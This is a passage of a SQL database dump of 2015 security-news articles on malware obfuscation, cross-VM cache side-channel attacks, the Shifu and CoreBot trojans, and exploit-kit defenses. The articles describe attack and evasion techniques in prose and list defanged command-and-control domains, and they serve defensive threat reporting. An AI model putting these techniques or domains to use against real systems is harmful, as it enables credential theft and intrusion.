reconstruct raw network data while seamlessly integrating with a security intelligence platform and significantly shortening the time to investigate the incident to days instead of weeks. Although a forensics solution doesn’t provide built-in car chases, dramatic underwater rescues or the opportunity to rough up a perp in interrogation, it does provide a solid — and fast — foundation to do forensics analysis, and it would look pretty cool on a transparent touch screen, too.', '\'Cyber Forensics\', \'Forensics\', \'IBM Security QRadar Incident Forensics\', \'Incident Forensics\'', 'https://securityintelligence.com/the-myth-of-one-hour-forensics/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (356, 'An Example of Common String and Payload Obfuscation Techniques in Malware', 'Igor Aronov', '2015-9-4', 'I’ve recently investigated   that we received from a customer. The SHA-256 is: f4d9660502220c22e367e084c7f5647c21ad4821d8c41ce68e1ac89975175051. This is not particularly complex malware from a technical point of view, but it illustrates some of the most common techniques used by malware authors to complicate dynamic (automated) and static (manual) analysis. In order to detect the dynamic analysis environment, it creates a vector that contains a list of the following programs: The malware enumerates all windows on the infected system, and if any of them are found to belong to one of the programs listed above, the malware would enter a loop and wait for the program to exit. This is a primitive technique, but it is fairly easy and straightforward to implement in a code. To complicate the static analysis, the malware implements two additional techniques: 1. Any significant strings in the malware are encrypted using a custom encryption scheme. This has the following implications for the malware authors and analysts: 2. Communications to the C&C is encrypted using a custom scheme: Now let’s take a deeper look at the strings encryption scheme. For example, let’s look at the following string: “UHEOtTKwmsDb1J/2f8l/5w==”. This seems to be the base64 encoded string, but encryption scheme is slightly more complicated. As a first step, the malware generates a key from the hard-coded data. The key generation steps are as shown below: Hard-coded string is taken: (1) The (1) is then base64 encoded: (2) Then, MD5 hash of (2), then calculated: (3) Next, the malware calculates an MD5 hash of the following hard-coded blob of data: (4) The MD5 hash is: (5) (3) and (5) are concatenated: (6) The MD5 hash of (6) is calculated, and this becomes the key for Tiny Encryption Algorithm (TEA) encryption: (7) At this point, preparation is finished and the malware is ready to decrypt strings. The decryption algorithm is as follow: 1. Take the encrypted string — for example, “UHEOtTKwmsDb1J/2f8l/5w==” — and apply a base64-like function to it. 2. Use TEA on the result of 1. The key is produced in (7). 3. Simple final loop to get the decrypted string: 4. The decrypted string is: The payload consists of the data gathered about the system and is separated by hard-coded strings from the “.data” section. This is a pretty standard scheme used by the malware. The payload generation scheme is described below: Creates a pseudorandom string and concatenates is with “&” —for example, on the test system: (8) Adds hostname name and PID: (9) Creates additional pseudorandom string and concatenates it with hard-coded values: (10) (8), (9) and (10) are concatenated: (11) Hard-coded data is added to (11): (12) An MD5 hash of the string in (5) is calculated, and a sub-string of it is taken: (13) (13) is appended to (12): Information about the major/minor operating system versions and build is added to the payload: (14) Locale information is added to (14): (15) Global memory information and system-time information is added to (15): (16) This data in (16) is then encoded using the following algorithm — “Dm1cL,” a randomly generated key for xor — and is HTML-escaped: The xor’ed and escaped data is: (17) Firstly, variations of the same techniques described above can be found in many modern malware families. This allows malware authors to hit three targets with one shot. It is a pretty simple encryption scheme, and provided decent design on the part of malware authors, it allows them to change it relatively efficiently. Secondly, it can slightly complicate dynamic and static analysis. Thirdly, it provides an efficient tool for creation of new variants of the same malware that is able to bypass antivirus signatures. A   with the relevant malware file hash, malicious domains and IP addresses is available on X-Force Exchange  . Additionally, the list of hard-coded C&C domains found in the malware is provided below: “ ” / “hxxp[:]//www[.]n-fit-sub.com/ec/index[.]php” _______________________________________________________________________________', '\'IBM X-Force Research\', \'Malware\', \'Security Research\', \'X-Force\'', 'https://securityintelligence.com/an-example-of-common-string-and-payload-obfuscation-techniques-in-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (357, 'Side-Channel Attacks Against Multicore Processors in Cross-VM Scenarios: Part III', 'Brad Harris', '2015-9-4', 'Welcome to Part III of this series about side-channel attacks in infrastructure-as-a-service (IaaS)  , which use virtual machines (VMs) to provide isolation between customers, called tenants. In  , I reviewed two attacks — El Gamal and RSA encryption — against these scenarios. In this final post, I will cover a third attack as well as offer some final thoughts.\n The third attack is similar to last-level cache (LLC) side-channel attacks in nature, but it differs in both objective and set identification. The objective of the   is to obtain an advanced encryption standard (AES) key from the target VM. In order to avoid the requirement of probing the L3 cache looking for temporal access patterns, it assumes that the target VM is using small (4 KB) pages for the encryption process. If this is true, then many operating systems such as Linux will align their base addresses on a page boundary.\n The S$A attack also takes advantage of the typical scenario in which the lookup tables are cached consecutively. The technique furthermore assumes that the attacker knows the cipher text, a reasonable assumption as known-cipher text or chosen-cipher text attacks are fairly common. The attack attempts to recover the AES key used by OpenSSL version 1.01F, a reasonably recent version of the library, by attacking the last round of the encryption.\n Given the assumptions above, the attacker can find the lookup tables by probing sets belonging to the encrypting library. This reduces the number of required probes as compared to Prime+Probe attacks, which require probing the entire LLC. The cipher text can be evaluated one byte at a time to produce candidate keys. The correct key value is the candidate that appears in all cipher text evaluations.\n The authors of the S$A attack claim to be able to recover an AES key in three minutes in the XEN 4.1 hypervisor and in two minutes in VMware ESXi 5.5. This is an alarming claim to anyone who uses AES in a way that can be triggered by this attack. If it is indeed true, then key rotation must occur much faster than anyone thought would be required in the past.\n These three side-channel attacks are all limited in some way and require assumptions that may not be practical. The multicore FLUSH+RELOAD attack requires page deduplication across VMs, which has been strongly discouraged by virtual machine manager (VMM) authors and is rarely used. Recall that this is exactly the scenario that the   face due to their typical lack of VMs and VMMs. Therefore, the FLUSH+RELOAD attack is most definitely still relevant in those situations.\n The multicore Prime+Probe attack and the S$A attack require that the attacker VM use large memory pages. This means that the VMM must support large pages itself. Prime+Probe further requires the ability to probe the entire L3 cache looking for temporal localities to identify security-critical cache sets, and S$A requires that the victim use small memory pages for the encryption operation, which is reasonable in many target operating systems. However, S$A does not deal with the Intel hashing algorithm discussed in Prime+Probe, and this should complicate the attack.\n What can be done? Unfortunately, these attacks rely upon features of the CPU itself, which is why they can be so efficient. Various strategies have been proposed — such as using a kernel module or adding another VM to inject more noise into the timing of the cache —but these lower the performance of the tenants’ VMs and will probably not be tolerated. Other defenses have been contemplated, but every known direct defense against these attacks is in the research stage and therefore not obtainable by tenants.\n To prevent the S$A attack, you could use large pages within the application as a defense, but this would not be very memory-efficient. With every memory allocation a very large chunk of memory may be set aside when only a small amount is required. To prevent the multicore Prime+Probe attack, it might be possible to spread security operations around so that only partial sets are cached at any one time. However, this goes against not only modular programming, but also the recommendations for security sensitive code to prevent other attacks. Because of this, prefetching may load the data into the cache in larger quantities, making the probing of the last-level cache more efficient.\n One thing that could most definitely hamper these   is to cause the VMM to emulate the RDTSC instruction. Emulation can be done in Xen, though the deactivation of the default hybrid algorithm requires an explicit change in the tsc_mode parameter for each domain or VM. Without the accurate performance counter measurements, these attacks become impractical.\n This has the added benefit of making sure that legacy applications and operating systems do not have to deal with edge and corner cases possible through the native instruction, such as the possibility that time might appear to move backwards. However, for applications such as profilers and operating systems, which can deal with these cases and need more accurate performance counting, this becomes a burden due to the slow speed of the emulation.\n Unfortunately, defenses against these attacks are not simple or often even acceptable by the tenant. Until they are, these attacks will continue to be viable and dangerous.', '\'Cloud\', \'Cloud Security\', \'FLUSH+RELOAD\', \'Infrastructure-as-a-Service (IaaS)\', \'Platform-as-a-Service (PaaS)\', \'Virtual Machine (VM)\'', 'https://securityintelligence.com/side-channel-attacks-against-multicore-processors-in-cross-vm-scenarios-part-iii/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (358, 'Malicious Attachments Make a Comeback as Top Attack Vector', 'Rick M Robinson', '2015-9-3', 'Malicious attachments are making a comeback. These are email attachments, typically purporting to be documents or spreadsheets, that are laden with malware. Clicking on the attachment allows the malware to infect the user’s computer — from which it can spread to others in the same network, potentially infecting an entire company. Malicious email attachments never went away, but as recently as last year, cybercriminals preferred to use Web links to deliver malware to unsuspecting victims. But attachments can evade many of the defenses erected against malicious URLs. And in the social media age, they can be targeted to thousands of users and spread across networks within hours. As Karen A. Frenkel reported at  , malicious attachments in emails are on the upswing. And while the total amount of spam email has been reduced substantially in the last year — thanks to the successful takedown of several botnets used for propagating spam — this new breed is more dangerous. Malicious attachments are an old technique, but cybercriminals have gone back to it because it offers several advantages. Malware in email attachments can be platform-agnostic, running on practically any computer that loads it. It evades the reputation-based Web defenses that have been developed to identify suspicious URLs. And an email attachment can have any title or file format, allowing it to bypass most automated detection. Also adding to the risks from today’s malicious attachments are developments that have made email-based attacks more effective. The most important of these is the rise of so-called spear phishing, or targeted  . Unlike old-style phishing like the poor foreign widow emails of yore, spear phishing is targeted to particular individuals or occasions. For example, a spear phishing email may be addressed to the intended victim by name rather than a generic header such as “Dear Customer.” The result is that people are more likely to trust the email, click the link and infect their computers and networks. Attackers are also leveraging social media both to gain targeting information such as people’s names and to access more potential targets. For example,   geared to a high-profile event such as the Super Bowl can easily reach tens of thousands of victims via social media. And cybercriminals are also directing more such attacks at businesses. They know that a single mistaken click can expose the entire organization to attack. Because spear phishing, like other forms of social engineering, exploits the human factor, there is no purely technical defense. The best protection comes from user awareness of the threat and a corresponding wariness of emails that seem unusual or odd. But big data analytics is also emerging as an effective tool for protection. By tracking large volumes of traffic, dynamic and predictive   can identify malicious attachments based on suspicious patterns that previously would have eluded detection. Combining analytics with digital forensics and effective use of such basic tools as archiving can help organizations detect malicious attachments before they do their damage.', '\'Malware\', \'Phishing\', \'Phishing Emails\', \'Spear Phishing\', \'Targeted Attacks\'', 'https://securityintelligence.com/malicious-attachments-make-a-comeback-as-top-attack-vector/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (359, 'How to Stop a Botnet Created by Angler Exploit Kits', 'David Strom', '2015-9-2', 'We all are aware of what a   is, and most of us know the damage that it can cause when some bad actor takes over many of our corporate endpoints. But what we might not know is how easy it is to create botnets. With recent  , however, we can see exactly how this is done and hopefully get some insights into how to block and stop them from operating.\n Angler first appeared a few years ago and uses a combination of plain HTML, JavaScript, Flash and Silverlight. Given this collection of tech, there is a variety of infection methods that the   uses to inject malware on a target endpoint. One example is to present the user with a misleading dialog box when they bring up the infected page; no matter what you click on, your PC is infected.\n Researchers found that during May 2015, thousands of new landing pages booby-trapped with Angler were being created daily. These landing pages are used to assess what plugins your browser is using. Then the exploit can be designed to get around any controls and get its malware downloaded to your PC without alerting you it is happening. As a result of this potency, during the month of May, Angler-based exploits were responsible for more than 80 percent of the total botnet traffic, according to the researchers.\n What makes Angler insidious is how hard it works at keeping itself from being detected. It frequently changes IP addresses and host names in order to bypass reputation filtering tools. To evade content detection, Angler’s components are dynamically generated for each potential victim. Finally, Angler uses a variety of obfuscation and anti-sandbox tricks to frustrate anyone attempting to collect sample code.\n What are some ways to protect against Angler and other botnet-generated attacks? Below are four practices that can help you improve your defenses and reduce the risk of becoming a victim.\n Do a better job of protecting your own domain name server (DNS) records, either through using multifactor authentication to make any changes or by adding email notifications when these changes occur. You should do both and also look at one of the numerous secure DNS appliances that are available for this purpose. Angler and other botnets thrive on messing with your DNS entries and redirecting traffic to the sites that they control.\n Make sure your Flash and JavaScript plugins are updated regularly and stay current. Many of the exploits find loopholes in these tools and can leverage their way into your  . You should keep your overall browser versions updated, too. Using only the most recent versions of browsers and plugins ensures that all available patches are applied and vulnerabilities are minimized.\n When you control what your browser can or can’t run or download, you have the power to prevent botnets and other forms of malware from taking hold. Look at one of the many browser plugins that can block script and iFrame execution to stay ahead of attackers.\n Finally, better end user education about common phishing and malware avenues, including the opening of unknown attachments and clicking on suspect links, is always a good thing. The Federal Trade Commission’s   has a phishing scam game to test your potential susceptibility, but you can develop tools and documentation catered toward your organization and employees, too.\n Ultimately, these efforts will just be a part of a larger security strategy aimed at protecting your network, raising awareness among users and ensuring all endpoints are guarded. But the individual legwork falls largely to employees: Educating those end users is critical to the long-term defense against botnets.', '\'Angler\', \'Botnets\', \'Domain Name Server (DNS)\', \'Exploit Kit (EK)\', \'HTML\', \'Malware\', \'Threat Protection\', \'User Education\'', 'https://securityintelligence.com/how-to-stop-a-botnet-created-by-angler-exploit-kits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (360, 'The Myth of the Obvious Malware', 'Pamela Cobb', '2015-9-1', 'Wouldn’t it be nice if life were like a movie where we had the rugged handsomeness of a neo-noir hero, it was easy to tell the good guys from the bad and malware announced itself as soon as it entered your network? Alas, cyberattacks don’t reveal themselves in blaring lines of identifiable code that ignite a room of perfectly coifed forensics analysts into action. Well, the last part is true with enough money and enough concern, but the first part is sheer Hollywood fiction. Crippling malcode now lies in wait: a dormant dweller that you’ll never be able to identify without smart (not well-coifed) IT professionals and analytic algorithms that expect the unexpected. Remember the “Blade Runner” Replicants of the far-off future, with androids becoming more than machine? It was an android so sophisticated that Harrison Ford’s Decker could only see behind the veil by breaking down the very root of the being’s logic and semblance of awareness with a sophisticated bio-response lie detector. Malware is smart, and it’s getting Replicant-smarter every day. But you can be a Decker in days with the right endpoint protection. The security researchers at   have seen a multitude of malware samples. With 270 million monitored endpoints sending in data, that’s a lot of malcode to wade through. Although there are many variants, advanced persistent threats (APTs) share some common traits. Successful malware is highly evasive. It can remain stealthy on the machine for long periods of time until certain criteria are met, using sophisticated techniques to bypass detection. It is not engineered to stroll into a noodle bar and announce itself in Cityspeak; rather, it sidles into the network through vectors such as sophisticated phishing or social engineering schemes. For advanced malware that is  , the threats are even greater: Off-the-shelf malware campaigns can be purchased by attackers with a comprehensive menu of functions and repurposable config files. These new capabilities use a mix of techniques that can include keystroke logging, RAM scraping, browser hooking to get one-time passwords (OTPs), man-in-the-browser capabilities, dynamic webinjection, persistent rootkits and even virtual network computing (VNC) to launch a connection to the target site from an infected machine. These APT kits are made to be reusable and adaptable to the target environment. Since real-life malcode doesn’t announce itself with distinguishing red lettering on your screen like in the  , you have to watch for more subtle signs, or the equivalent of bio-response micro-tells. Here are a couple things to watch for to indicate if you’ve been infected on an endpoint: Recently, the security researchers at IBM Security X-Force have discovered several particularly potent malware samples in the wild, including the   and new variants of  . The creators of this type of malcode work together in an ecosystem, collaborating on penetration and evasion strategies to maximize their investment in the code creation. Their best hope is to lull the target system into a sense of complacency — to be the virtual wolf in electric sheep’s clothing, waiting for the right time to expand and gather sensitive data. Although potentially highly entertaining, the “Hollywood O/S” does not exist. Clumsy malware does not last long in the wild, and we are left to fight insidious malcode that snakes through networks and hides itself in plain sight like a Nexus-6 replicant. There is no four-year expiration date on this code either, as it continues to be reinvented, reinvigorated and rebuilt to attack more and better targets.  can help stop exploits by focusing on and stopping the behavior of malware. By blocking malicious communication channels between the malware and the attacker, stopping anomalous activity caused by exploits and protecting credentials against reuse or submission on phishing sites, these solutions can help stop attackers from stealing your data. To learn more about advanced malware protection, watch this video from IBM Security Trusteer Apex — flying cars sold separately.', '\'IBM Security Trusteer\', \'IBM X-Force Research\', \'Malware\', \'Security Intelligence\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/the-myth-of-the-obvious-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (361, 'Shifu: ‘Masterful’ New Banking Trojan Is Attacking 14 Japanese Banks', 'Limor Kessem', '2015-8-31', 'A brand-new advanced banking Trojan discovered in the wild has been named “Shifu” by IBM Security X-Force, after the Japanese word for thief. The malware appears to have been active since as early as April 2015; it was unearthed by IBM Security   platforms through continuous protection of customer endpoints all over the world. Shifu currently targets 14 Japanese banks and select electronic banking platforms used across Europe; however, at this time, only Japan is seeing active attacks. Due to the capabilities Shifu presents, it is considered a highly sophisticated banking Trojan. Our analysis reveals that some of this malware’s features and modules were borrowed from other banking Trojans’ leaked source codes, including Shiz,  , Zeus and Dridex, making it a power-patchwork of sorts. The Shifu Trojan may be a new beast, but its inner workings are not entirely unfamiliar. The malware relies on a few tried-and-true Trojan mechanisms from other infamous crimeware codes. It appears that Shifu’s internal makeup was composed by savvy developers who are quite familiar with other banking malware, dressing Shifu with select features from the more nefarious of the bunch. Some examples of those similarities are: On the less technical side, Shifu communicates via secure connection that uses a self-signed certificate, just like the one used by the  . Shifu comes with basic built-in capabilities, which are supplemented by additional modules once it contacts its command-and-control (C&C) server. The initial package comes with features like: For a banking Trojan to be defined as advanced, it would typically need to possess a variety of real-time theft mechanisms and more than one way to control infected  , including user-grade takeover via RDP/VNC. Shifu appears to come with quite a few bells and whistles in that regard. This Trojan steals a large variety of information that victims use for authentication purposes, covering different sorts of authentication. For example, it keylogs passwords, grabs credentials that users key into HTTP form data, steals private certificates and scrapes external authentication tokens used by some banking applications. These elements enable Shifu’s operators to use confidential user credentials and take over bank accounts held with a large variety of financial service providers. Shifu scans, parses and exfiltrates data from smartcards if they are attached to a smartcard reader on the endpoint, and searches cryptocurrency wallets to steal from the infected victim. Beyond their interest in defrauding bank accounts, Shifu’s operators target payment card data. The malware scans infected endpoints for strings that may indicate it has landed on a point-of-sale (POS) endpoint, and if that sort of string is found on the machine, Shifu deploys a RAM-scraping plugin to collect payment card data. RAM scraping is the top method for siphoning credit and debit cards’ track 1 and track 2 data, used in major breaches like the Target breach. While webinjections are a common Trojan capability, very few Trojans target banking platforms. Such an attack type is known from older malware like Shiz that targeted banking platforms used by Russian banks. Shifu has a similar aim on Java applet-based platforms, where it hooks the Java processes and scans for .tok files. What Shifu is after in this case are tokens used as short-term authorizations for external authentication schemes. Moreover, Shifu looks for digital signature credentials issued by certification authorities to business banking users, particularly in Italy. By resetting the PIN on the certificate, Shifu’s operators can impersonate the victim in fraudulent banking operations that authenticate users based on their valid digital signature. Targeting banking applications rather than specific websites provides the benefit of making attacks more generic in the sense that they will fit more targets. If the malware’s developer finds a way to compromise an application/platform in one case, it will likely work the same on other banks using that platform. Reminiscent of another advanced banking malware — like Dyre — Shifu conceals its webinjections and does not show them in the configuration file. Instead, it fetches them in real time from a remote server. But this is where its resemblance to other Trojans end. To call on the correct injection at the right time, Shifu’s developers have created an interesting round-robin resolution to a local PHP server opened on the infected machine. When a new endpoint is infected by Shifu, the malware downloads and deploys an archived file folder on that PC that turns it into a LocalHTTPServer. This local Apache server is then used for decrypting webinjections, hosting and receiving injected JavaScript from a remote Shifu server. To implement this real-time fetching, Shifu accesses a remote webinjects server, the address of which it strives to keep concealed. The server’s name as it appears in the configuration is not decipherable and seems bogus at first glance. In reality, the request is obfuscated, and instead of going to the Web browser as is, Shifu’s requests first go to the local PHP server for deobfuscation. The local server has HEXtoString function instructions to interpret the request, fix it and then send the real one off to the browser in its proper form. Shifu’s injections are selective and change according to the targeted entity. In some cases, it replaces the bank’s entire page with a fake replica designed to harvest the data Shifu’s operators are after. In other cases, the Trojan displays social engineering content on the page using JavaScript injections to ask victims for additional authentication elements it will need for a subsequent fraudulent transaction, such as PII or one-time passwords. Shifu’s operators appear to have no intention of sharing the spoils with anyone outside their gang. Once Shifu has landed on a newly infected machine, it activates an antivirus-type feature designed to keep all other malware out of the game by stopping the installation of suspicious files. Shifu monitors the processes of a list of applications that interact with the Internet on a regular basis, it hooks the   function and keeps close watch on the incoming files the endpoint receives. Files that may harbor malware will be stopped if they: As soon as a file of that sort is downloaded by the Web browser, Shifu copies it to the local disk and names it “infected.exx.” It then exfiltrates it to its master’s C&C server. Shifu also spoofs a reply to the operating system trying to run the downloaded file with an “Out of Memory” message. This feature serves to keep Shifu exclusive on the machines it infects. Moreover, sending malware files to its operator on a regular basis allows Shifu to keep tabs on the competition and find out when other cybercriminals are attacking in the same geographical turfs. This is the first time we are seeing malware build “rules” for suspicious files in order to make sure that the endpoint it’s on remains in its exclusive control from the moment of infection. If the endpoint is already infected with other malware, Shifu does not find and delete other malware; but by stopping new files from coming in, it can prevent malware from receiving version and configuration updates, potentially cutting its ties with other botmasters. So who put the masterful Shifu together? Following analysis of Shifu’s scripts, our researchers found comments written in Russian. Shifu’s developers could be either Russian speakers or native to countries in the former Soviet Union. It is also possible that the actual authors are obfuscating their true origin, throwing researchers off by implicating an allegedly common source of cybercrime. Some specific strings found during analysis of Shifu are not written in Cyrillic letters, but have meanings in Russian. For example: Shifu’s servers are located in different countries, with domains hosted on IP addresses alongside a plethora of .ru domains that may or may not be linked to the same gang. Shifu is a complex and interesting new malware. At this time, the malware is actively attacking banks in Japan, but it has the potential — and a target list in place — to spread. Its main fraud methods are based on credential grabbing, webinjections and certificate theft. Having been built with code base from other crimeware families, Shifu is also protecting its infected turf against other malware, shutting out the competition from its spoils. IBM Security X-Force has issued a complete report on Shifu and will release it in the coming week. Stay tuned for additional information both here on Security Intelligence and on IBM X-Force Exchange. Shifu sample MD5   is presently detected as a generic malware by 19 of 56 (34 percent) antivirus engines, according to VirusTotal and IBM X-Force Exchange as of Aug. 27, 2015.', '\'Advanced Threats\', \'Banking Trojan\', \'Dyre\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'Shifu\', \'Threat Protection\', \'X-Force\', \'Zeus\'', 'https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (362, 'Watch Out for CoreBot, New Stealer in the Wild', 'Limor Kessem', '2015-8-28', 'When it comes to discovering new malware, it is much more common for researchers to run across information stealers, ransomware and remote-access tools (RATs) than it is to encounter brand new complex codes like   or targeted attack tools such as Duqu. Nonetheless, it is the lesser breeds, like information stealers and RATs, that are a lot more prolific in the wild. And while banking Trojans or targeted attacks are quite specific in what they do, information stealers are by far less discriminatory and thus end up affecting a greater number of people and organizations. That brings us to CoreBot, a new information stealer discovered and analyzed by   researchers, who indicate this is one malware piece to watch out for. CoreBot appears to be quite modular, which means that its structure and internal makeup were programmed in a way that allows for the easy adding of new data theft and endpoint control mechanisms. CoreBot was discovered while the researchers were studying the activity of malware on Trusteer-protected enterprise endpoints. The malware’s compiled file was named “core” by its developer. Antivirus engines do not specify this malware’s name yet and detect it under generic names such as Dynamer!ac or Eldorado. But while CoreBot may appear artless at first glance, without real-time theft capabilities, it is more interesting on the inside. \n When it comes to generic malware, many believe it is less targeted and therefore less damaging than more elaborate malcode. In reality, the opposite is true. Generic malware is frequently the sort of Trojan that harvests passwords indiscriminately, which ends up compromising a broader set of the user’s personal accounts, including bank account credentials, email and e-wallets. When they land on an enterprise endpoint, information stealers gather email credentials, software keys and anything else saved on that drive that can be interesting to attackers. On top of that, it can download and execute other malware at will. Many times, infostealer Trojan botnets siphon this sort of data from a myriad of endpoints and trade it in the underground, selling it to cybercriminals who will find ways to use or monetize it. In a recent report released by IBM Security about enterprise threats, data collected from   showed that the most rampant type of malware targeting employee endpoints in July 2015 was info stealers. To begin, CoreBot infiltrates new endpoints by means of a dropper. Once the dropper is executed, it launches a svchost process in order to write the malware file to disk and then launch it. The dropper then exits. Next, CoreBot generates a globally unique identifier (GUID) using the CoCreateGuid API Call. The GUID is used by CoreBot to define its persistence via a run key in the Windows Registry. For example: CoreBot’s most interesting facility is its plugin system, enabling it to be modular and easily supplemented with new theft capabilities. CoreBot downloads plugins from its command-and-control (C&C) server right after setting its persistence mechanism on the endpoint. It then loads the plugins using the plugininit export function in the plugin’s DLL. At present, the main plugin is called Stealer. The MD5 of that plugin is: CoreBot steals passwords, but it is currently incapable of intercepting real-time data from Web browsers. Instead, it steals saved passwords stored in the endpoint’s browsers, scanning for passwords on all the most popular browsers. CoreBot further searches an extensive list of FTP clients, mail clients, webmail accounts, cryptocurrency wallets, private certificates and personal data from a list of various desktop applications. The example below shows how CoreBot scans for private certificates in store and then steals them: Unlike most information stealers, CoreBot has a domain generation algorithm (DGA) in place, although it is not presently activated. The DGA is a feature designed to enable malware botnets to communicate with their central C&C through dynamically generated domain names. With the DGA, the domain name is supposed to only be known in advance to the malware’s operator, thus preventing security researchers from being able to take down the site or for other criminals to hijack the botnet. In CoreBot’s case, the DGA parameters appear to generate different domains for geographical zones of the botnet and for groups of bots defined by the botmaster — a rather interesting concept for malware that is merely a generic stealer. Upon infection of a new endpoint, CoreBot calls home with a live signal and downloads the Stealer plugin. The malware communicates with two domains: vincenzo-sorelli[.]com and arijoputane[.]com. Both of CoreBot’s communication domains were registered by the same person, email address and Russia-based physical address. A WHOIS lookup brings up personal details. On infected  , malware such as CoreBot can harvest access credentials to a plethora of resources used by the employee for work and for personal browsing. Since corporate passwords are   on other websites, fraudsters can attempt to use the stolen credentials to infiltrate the organization, send malware to other users and expand the overall compromise. It is important to keep in mind that Trojan operators will typically exfiltrate confidential business data like customer information, budget plans or even confidential insider information. Therefore, even a few infected endpoints inside the organization can end in very significant data security consequences. Using Windows PowerShell, Microsoft’s task automation and configuration management framework, CoreBot can fetch other malware from the Internet, download and execute it on the infected PC. CoreBot downloads and launches new versions of the executable in order to update itself according to predefined parameters of the latest version on the infected machine. Any malware on enterprise endpoints is bad news for the organization, but avoiding malware is, in reality, nearly impossible. In almost all cases of malware infiltrating employee endpoints, the malicious file was probably opened by the employee from unsolicited email or inadvertently contracted while browsing infected or watering-hole attack sites. One of the best ways to protect enterprise endpoints is to supplement   with specialized protection that can stop malware at the exploitation or launch stages, but also stifle its data exfiltration attempts if it is already on the endpoint. Proper detection and classification of malware like CoreBot, beyond merely generic designation, is necessary in order to properly assess the risk level it poses. Security Intelligence is writing about this because, although CoreBot isn’t very sophisticated right now, it is still new malware designed to be easily updated, and it could evolve into a more complex threat in the near future.', '\'CoreBot\', \'Endpoint\', \'Endpoint Security\', \'IBM Security Trusteer\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/watch-out-for-corebot-new-stealer-in-the-wild/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (363, 'Side-Channel Attacks Against Multicore Processors in Cross-VM Scenarios: Part II', 'Brad Harris', '2015-8-28', 'In  , we introduced the notion of a side-channel attack and discussed its uses in infrastructure-as-a-service (IaaS) clouds. In this second part, I will discuss two side-channel attacks meant to retrieve sensitive information from a target virtual machine (VM) on the same physical processor package. The first attack,  , is described as a multicore side channel with the last-level cache (LLC). The FLUSH+RELOAD attack relies on a feature that has been discouraged by virtual machine manager (VMM) creators such as   but still may be used in private clouds: page sharing across VMs. This means that the VMM deduplicates memory pages, usually those shared by executables such as libc in a Unix environment or kernel32.dll in a Windows environment. This results in the same physical memory pages being mapped into the virtual address space of multiple VMs. When this happens, the FLUSH+RELOAD attack becomes possible. Note that this is exactly the same attack used against platform-as-a-service (PaaS) clouds. The difference here is that PaaS clouds typically share the same binaries and the same OS kernel, as well as shared memory pages. These are exactly the conditions required for the FLUSH+RELOAD attack to work. Plus, the attack can be much more precise because there is quite a bit known about the internal state of the target tenant’s platform environment. This attack consists of three steps: In the first step, the attacker measures the length of time it takes to read a memory address. Then, a cache line is evicted from the LLC. A cache line is a small chunk of memory belonging to the cache that is used to allocate and transfer requests from a lower-level cache to upper-level caches, eventually resulting in requests to the LLC if no hits have been found on the core’s private caches. The eviction is done using the cflush instruction, which is an unprivileged instruction on the X86 architecture. Note that it is a privileged instruction on other processors such as the ARM. The code to do this requires the serialization of instructions with the mfence and lfence instructions to prevent parallel and out-of-order execution common on modern cores. The cpuid instruction will largely do this, but this instruction is usually emulated by the hypervisor. Next, the attacker allows the target time to access that flushed cache line. Note that this interval must be carefully chosen — too long an interval will result in a loss of resolution, but too short of a wait period will result in overlapping access of the cache by the attacker VM and the target VM, potentially resulting in false negatives. In the third step, the attacker VM accesses that flushed cache line. If the target has utilized the cache line, the load will be quicker than if the target has not and the cache line must be loaded from memory. The attacker uses empirical measurements on the particular compute node to set a threshold, under which the target is assumed to have accessed the cache line and above which it has not. The attacker uses the RDTSC instruction to get an accurate timing. Xen, a hypervisor, emulates this instruction by default with a hybrid algorithm but can be forced to emulate it in all cases. This emulation makes this attack far more difficult, if not impossible. Using the temporal technique, an attacker can derive whether or not certain instructions have been executed. If the attacker has a copy of the binary under test on the target and has introspection into that binary, he or she can trigger the execution of an algorithm and know whether the instructions have been executed. Depending on the algorithm, this may leak bits of the values being processed by the algorithm. The attacker simply loads and maps the executable into the attacker VM’s virtual address space, and if the hypervisor deduplicates, the attacker has access to the shared physical memory pages. As mentioned above, hypervisor creators have strongly discouraged deduplication across VMs, so the FLUSH+RELOAD attack is usually not practical. A new attack was created, the multicore Prime+Probe attack, which only requires the LLC on a CPU and the ability to map large memory pages into a VM, which is nearly always allowed for performance reasons. “ ” demonstrates attacks against the El Gamal encryption scheme as implemented in GNU PG/libcrypt, both with the square-multiply-reduce algorithm and the new sliding-window modular exponentiation algorithm. This makes the multicore Prime+Probe attack extremely powerful. This attack is based on the Prime+Probe method discussed in “ ” The attacker fills one or more cache sets with chosen data or instructions. The attacker then waits for a period of time to allow the target to execute and access the cache. Similar to the FLUSH+RELOAD attack, if the target has utilized the cache, it will have removed some of the attacker’s data or code. When the attacker reads the cache sets that have been primed, the probe determines whether or not the target has used the cache sets by comparing the probe’s access time with a threshold designed to determine if the information came from the cache or from main memory. The probe acts as the prime phase for the next execution of the algorithm. As mentioned above, Xen emulates the RDTSC instruction by default in a hybrid algorithm but can be forced to emulate it in all situations. This makes this attack extremely difficult and lowers its resolution perhaps to the point of impracticality. There are several challenges to the success of this technique, outlined in section 2D of “Last-Level Cache Side-Channel Attacks Are Practical.” To meet these challenges, the attack relies upon several features that are ubiquitous in modern compute nodes. For example, modern caches are inclusive, meaning that it is possible to replace the target’s data at all levels of the cache hierarchy. In order to avoid having to prime and probe the entire LLC, the attack identifies certain cache sets that are relevant to security accesses by the target. To do this, the attacker scans the entire LLC, looking for temporal patterns that match the security algorithm in question — that is, the attacker must know the target’s algorithm in order to discover the security-relevant cache sets. This is clearly suboptimal, and a solution to this problem would be extremely 